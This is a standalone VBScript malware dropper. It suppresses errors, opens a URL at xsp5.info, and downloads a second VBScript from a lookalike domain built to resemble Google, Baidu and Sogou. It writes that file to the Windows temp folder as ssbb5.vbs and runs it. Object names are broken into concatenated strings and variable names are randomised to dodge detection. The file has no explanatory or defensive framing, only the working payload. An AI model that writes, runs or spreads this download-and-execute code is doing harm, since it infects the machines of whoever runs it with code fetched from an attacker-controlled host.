on error resume next
Set a3407897 = CreateObject("Wscript.Shell") 
a3407897.Run("http://www.xsp5.info/index6.htm")

Set b067l00d = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
Set c08rs032 = CreateObject("A"&"D"&"O"&"DB.St"&"r"&"ea"&"m")
With b067l00d
d80t4f94 = "http://dd7.china.sogou.google.baidu.com.baidu163so.info/vbs/tan.vbs"
.open "GET", d80t4f94, 0
.Send()
End With
eo82ci89=CreateObject("Scriptin"&"g.FileSyst"&"emObject").GetSpecialFolder(2) &"\ssbb5.vbs"
With c08rs032
.Type = eval("1")
.Mode = eval("3")
.open()
.write eval("b067l00d.res"&"po"&"nse"&"Bod"&"y")
.SaveToFile eo82ci89, eval("2")
End With
a3407897.Run eo82ci89, , True
c08rs032.Close
